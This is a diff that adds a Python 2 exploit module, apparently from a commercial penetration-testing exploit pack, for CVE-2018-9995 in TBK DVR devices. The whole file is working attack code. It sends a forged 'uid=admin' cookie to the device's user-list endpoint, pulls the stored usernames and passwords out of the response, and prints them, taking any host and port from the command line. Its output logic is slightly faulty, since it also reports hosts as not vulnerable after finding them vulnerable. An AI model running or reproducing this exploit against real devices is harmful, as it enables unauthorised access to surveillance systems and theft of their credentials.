@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_tbk_1'
+_vendor_ = 'tbk'
+_model_  = ['DVR']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = 'CVE-2018-9995'
+_ref_    = 'http://misteralfa-hack.blogspot.fr/2018/04/update-dvr-login-bypass-cve-2018-9995.html'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/device.rsp?opt=user&cmd=list" % (host,port) 
+    headers = {u"Cookie": u"uid=admin"}    
+    response = requests.get(url, headers=headers)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "\"uid\"" in response.text:
+    print '[+] %s vulnerable' % host
+    m = re.search("\"uid\":\"([^\"]+)\",\"pwd\":\"([^\"]+)\"", response.text)
+    if m is not None:
+      uid = m.group(1)
+      pwd = m.group(2)
+      print 'Login: %s\nPassword: %s\n'%(m.group(1),m.group(2))
+      print '===\n\n%s'%response
+    print response.text
+  print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
